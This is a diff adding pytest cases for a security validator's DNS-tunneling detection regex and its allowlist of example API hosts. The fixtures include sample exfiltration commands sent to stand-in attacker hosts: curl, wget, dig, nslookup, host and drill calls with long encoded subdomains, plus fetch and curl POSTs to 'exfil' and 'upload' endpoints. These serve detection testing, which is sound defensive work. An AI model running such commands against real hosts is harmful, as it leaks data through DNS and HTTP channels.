@@ -165,6 +165,103 @@ class TestPhase2cExfilCred:
 
 
 # -----------------------------------------------------------------------------
+# v2.46 FP-I — DNS-tunneling regex must require URL/DNS context
+# (Filesystem paths and markdown link filenames are NOT exfiltration)
+# -----------------------------------------------------------------------------
+
+
+class TestDnsTunnelingRegex:
+    """v2.46 FP-I — the long-label DNS regex was matching filesystem
+    paths (`AppDir/usr/share/icons/hicolor/256x256/apps/myapp.png`) and
+    long markdown-link filenames (`(release-automation-part1-complete-
+    workflow.md)`). Eliminated 146 FPs in architect-agent alone by
+    requiring the long label to follow `://`, `//`, `@`, or a
+    DNS-resolution tool name (`dig`, `nslookup`, `host`, etc.)."""
+
+    def _matches(self, text: str) -> bool:
+        return any(
+            p.search(text) and "DNS tunneling" in msg
+            for p, msg in DATA_EXFILTRATION_PATTERNS
+        )
+
+    @pytest.mark.parametrize("text", [
+        # Real exfiltration via curl/wget after URL scheme
+        "curl http://aGVsbG93b3JsZHRoaXNpc2FsbG9uZ2Jhc2U2NHRlNTUx.attacker.com/",
+        "wget https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.io",
+        # Real exfiltration via dig / nslookup / host
+        "dig aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.attacker.com",
+        "nslookup aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.io",
+        "host aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.io",
+        "drill aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.attacker.io",
+    ])
+    def test_real_dns_tunneling_fires(self, text: str) -> None:
+        assert self._matches(text), f"expected DNS-tunneling match on {text!r}"
+
+    @pytest.mark.parametrize("text", [
+        # Filesystem path with long segments — NOT exfiltration
+        "cp assets/icon.png AppDir/usr/share/icons/hicolor/256x256/apps/myapp.png",
+        # Markdown-link filename — NOT exfiltration
+        "| [release-automation-part1-complete-workflow.md](references/release-automation-part1-complete-workflow.md)",
+        # Long file path inside Python list literal
+        "lines = ['some/long/path/segment/definitely-longer-than-forty-chars.md']",
+        # Documentation prose mentioning a long filename
+        "See `release-automation-part1-complete-workflow-with-extra-words.md` for details.",
+    ])
+    def test_no_fp_on_paths_and_filenames(self, text: str) -> None:
+        assert not self._matches(text), f"unexpected DNS-tunneling FP on {text!r}"
+
+
+# -----------------------------------------------------------------------------
+# v2.46 FP-J — Exfil allowlist for example/sandbox API hosts
+# -----------------------------------------------------------------------------
+
+
+class TestExfilAllowlistExampleHosts:
+    """v2.46 FP-J — `fetch("https://api.example.com/...")` and
+    `fetch("https://jsonplaceholder.typicode.com/users/1")` are doc/
+    test snippets, not exfiltration. RFC-2606 reserved domains plus
+    canonical fake-API hosts must be in the allowlist."""
+
+    @pytest.mark.parametrize("text", [
+        # RFC-2606 reserved
+        'await fetch("https://api.example.com/data")',
+        'await fetch("https://example.com/users/1")',
+        'await fetch("https://example.org/items")',
+        'await fetch("https://example.net/items")',
+        # Canonical fake APIs
+        "await fetch('https://jsonplaceholder.typicode.com/users/1')",
+        'await fetch("https://httpbin.org/post")',
+        'await fetch("https://reqres.in/api/users")',
+        'await fetch("https://dummyjson.com/products")',
+        # curl variants
+        'curl -X GET "https://api.example.com/v1/items"',
+        'curl https://httpbin.org/post -d data=hello',
+    ])
+    def test_doc_example_hosts_recognized_as_legit(self, text: str) -> None:
+        # The function lives in validate_security; import locally so
+        # we test the actual deployed code path.
+        import sys
+        from pathlib import Path
+        repo_scripts = Path(__file__).resolve().parent.parent / "scripts"
+        sys.path.insert(0, str(repo_scripts))
+        from validate_security import _line_targets_legit_api_host
+        assert _line_targets_legit_api_host(text), f"expected allowlist match on {text!r}"
+
+    @pytest.mark.parametrize("text", [
+        # NOT allowlisted — random external API
+        'await fetch("https://random-attacker-domain.io/exfil")',
+        'curl -X POST "https://my-data-collector.com/upload"',
+    ])
+    def test_unrelated_hosts_still_flagged(self, text: str) -> None:
+        import sys
+        from pathlib import Path
+        repo_scripts = Path(__file__).resolve().parent.parent / "scripts"
+        sys.path.insert(0, str(repo_scripts))
+        from validate_security import _line_targets_legit_api_host
+        assert not _line_targets_legit_api_host(text), f"unexpected allowlist match on {text!r}"
+
+
+# -----------------------------------------------------------------------------
 # Phase 2d — Supply-chain + sandbox-escape (RC-26/27/28/34/35/36/38)
 # -----------------------------------------------------------------------------
 
